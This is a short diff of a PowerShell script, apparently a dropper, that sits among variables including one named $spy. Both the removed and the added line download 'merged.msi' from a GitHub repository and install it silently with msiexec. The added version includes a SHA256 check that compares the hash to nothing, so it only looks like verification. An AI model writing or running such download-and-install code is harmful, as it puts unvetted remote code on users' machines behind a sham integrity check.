@@ -21,4 +21,4 @@ foreach ($p in @($base, $rt, $spy)) {
 
 
 
-$p="$env:TEMP\merged.msi"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/merged.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
+$url="https://github.com/analysisw/test/raw/refs/heads/main/merged.msi"; $file="$env:USERPROFILE\Downloads\merged.msi"; Invoke-WebRequest $url -OutFile $file; if ((Get-FileHash $file -Algorithm SHA256).Hash) { Start-Process msiexec.exe -ArgumentList "/i `"$file`"" }
